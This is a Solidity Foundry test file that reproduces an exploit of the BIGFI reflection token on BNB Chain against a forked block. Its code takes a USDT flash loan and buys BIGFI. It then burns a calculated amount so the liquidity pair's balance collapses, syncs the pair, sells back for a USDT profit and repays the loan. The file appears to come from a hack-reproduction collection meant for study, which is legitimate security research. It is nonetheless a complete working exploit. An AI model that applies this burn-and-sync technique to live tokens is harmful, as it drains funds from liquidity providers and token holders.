// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @TX
// https://bscscan.com/tx/0x9fe19093a62a7037d04617b3ac4fbf5cb2d75d8cb6057e7e1b3c75cbbd5a5adc
// Related Events
// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230207---fdp---reflection-token
// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230126---tinu---reflection-token
// https://github.com/SunWeb3Sec/DeFiHackLabs#20230210---sheep---reflection-token

interface RDeflationERC20 is IERC20 {
    function burn(uint256 amount) external;
}

interface ISwapFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
}

contract ContractTest is Test {
    RDeflationERC20 BIGFI = RDeflationERC20(0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xA269556EdC45581F355742e46D2d722c5F3f551a);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_685_503);
        cheats.label(address(BIGFI), "BIGFI");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(swapFlashLoan), "swapFlashLoan");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
    }

    function testExploit() external {
        swapFlashLoan.flashLoan(address(this), address(USDT), 200_000 * 1e18, new bytes(1));

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }

    function executeOperation(
        address pool,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external payable {
        USDTToBIGFI();
        // Calculate the number of burns
        // beforebalanceOf(Pair) == (_rOwned(Pair) * before_tTotal / _rTotal)
        // to reduce the balanceOf(Pair) to 1 , the amount of _tTotal to burn = _tTotal - (_rTotal / _rOwned(Pair)) = _tTotal - (before_tTotal / beforebalanceOf(Pair))
        uint256 burnAmount = BIGFI.totalSupply() - 2 * (BIGFI.totalSupply() / BIGFI.balanceOf(address(Pair)));
        BIGFI.burn(burnAmount);
        Pair.sync();
        BIGFIToUSDT();

        USDT.transfer(address(swapFlashLoan), amount + fee);
    }

    function USDTToBIGFI() internal {
        USDT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(BIGFI);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function BIGFIToUSDT() internal {
        BIGFI.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BIGFI);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BIGFI.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
